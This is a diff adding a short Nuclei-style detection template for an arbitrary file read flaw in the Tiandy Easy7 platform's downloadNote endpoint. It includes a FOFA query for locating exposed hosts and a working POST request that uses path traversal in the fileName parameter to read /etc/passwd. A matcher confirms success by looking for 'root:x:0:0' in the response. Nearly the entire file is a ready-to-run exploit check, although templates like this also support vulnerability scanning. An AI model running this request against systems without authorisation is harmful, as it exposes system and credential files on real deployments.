@@ -1,0 +1,29 @@
+id: tiandy-easy7-downloadnote-file-read
+
+info:
+  name: "Tiandy-Easy7平台downloadNote接口任意文件读取"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="Tiandy-Easy7"
+      Tiandy-Easy7系统downloadNote接口未正确校验文件访问权限，攻击者可通过操纵请求参数实现任意路径文件读取，从而获取系统配置文件、敏感数据等非授权资源。
+  tags: 天地伟业Easy7
+
+http:
+- raw:
+  - |
+    POST /Easy7/rest/file/downloadNote HTTP/1.1
+    Host: {{Hostname}}
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+    Accept-Encoding: gzip, deflate
+
+    fileName=/../../../../../../etc/passwd&fullName=1
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
